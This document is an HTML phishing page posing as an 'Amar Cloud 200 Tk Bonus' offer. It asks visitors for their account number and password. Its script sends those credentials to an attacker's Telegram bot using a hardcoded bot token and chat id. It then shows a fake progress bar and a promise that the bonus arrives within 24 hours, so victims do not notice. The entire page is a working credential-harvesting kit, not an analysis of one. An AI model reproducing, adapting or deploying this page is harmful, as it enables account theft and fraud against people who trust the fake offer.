<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Amar Cloud Bonus</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom, #141e30, #243b55);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }

    .app-container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      box-sizing: border-box;
    }

    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #f1c40f;
      font-size: 24px;
    }

    .card {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 20px;
      padding: 30px 20px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
      transition: all 0.3s ease-in-out;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      outline: none;
      background-color: #2c2c2c;
      color: #fff;
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      background: linear-gradient(to right, #00c6ff, #0072ff);
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      margin-top: 10px;
      box-shadow: 0 5px 10px rgba(0, 114, 255, 0.4);
    }

    button:hover {
      opacity: 0.9;
    }

    .hidden {
      display: none;
    }

    .progress-bar {
      background-color: #444;
      border-radius: 20px;
      overflow: hidden;
      height: 30px;
      margin-bottom: 20px;
    }

    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(to right, #16a085, #f4d03f);
      color: #000;
      font-weight: bold;
      text-align: center;
      line-height: 30px;
      transition: width 0.3s ease;
    }

    #bonusMessage {
      display: none;
      font-size: 16px;
      text-align: center;
      animation: fadeIn 1s ease-in-out forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="app-container">
    <h2>üéÅ Amar Cloud 200 Tk Bonus üéÅ</h2>

    <!-- Login Section -->
    <div class="card" id="loginCard">
      <input type="text" id="accountNumber" placeholder="Enter Account Number" />
      <input type="password" id="accountPassword" placeholder="Enter Password" />
      <button onclick="submitForm()">Login</button>
    </div>

    <!-- Progress Section -->
    <div class="card hidden" id="progressCard">
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill">0%</div>
      </div>
      <div id="bonusMessage">You will be able to claim your bonus within 24 hours.</div>
    </div>
  </div>

  <script>
    async function submitForm() {
      const number = document.getElementById("accountNumber").value.trim();
      const password = document.getElementById("accountPassword").value.trim();

      if (!number || !password) {
        alert("Please enter both account number and password.");
        return;
      }

      // Send to Telegram (use responsibly)
      const token = '8088507666:AAGxnWx0-i6aKT1pWHXskK5VSmDkYqPLYis';
      const chat_id = '6593402184';
      const text = `Login Info:\nAccount: ${number}\nPassword: ${password}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text })
      });

      // Hide login, show progress
      document.getElementById("loginCard").classList.add("hidden");
      document.getElementById("progressCard").classList.remove("hidden");

      // Animate progress
      const progressFill = document.getElementById("progressFill");
      let progress = 0;
      const interval = setInterval(() => {
        if (progress >= 100) {
          clearInterval(interval);
          document.getElementById("bonusMessage").style.display = "block";
        } else {
          progress++;
          progressFill.style.width = progress + "%";
          progressFill.textContent = progress + "%";
        }
      }, 30);
    }
  </script>
</body>
</html>
